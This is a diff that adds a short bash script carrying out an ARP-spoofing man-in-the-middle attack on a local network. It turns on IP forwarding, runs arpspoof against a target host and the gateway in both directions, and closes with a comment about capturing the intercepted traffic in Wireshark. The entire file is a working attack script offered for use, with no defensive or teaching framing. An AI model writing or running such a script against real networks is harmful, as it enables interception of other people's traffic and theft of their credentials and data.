@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# Enable IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Set target and gateway IP addresses
+TARGET_IP="192.168.1.5"
+GATEWAY_IP="192.168.1.1"
+
+# Set your network interface
+INTERFACE="eth0"
+
+# Perform ARP spoofing and discard only standard output
+sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP > /dev/null &
+sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP > /dev/null &
+
+#then use Wireshark 
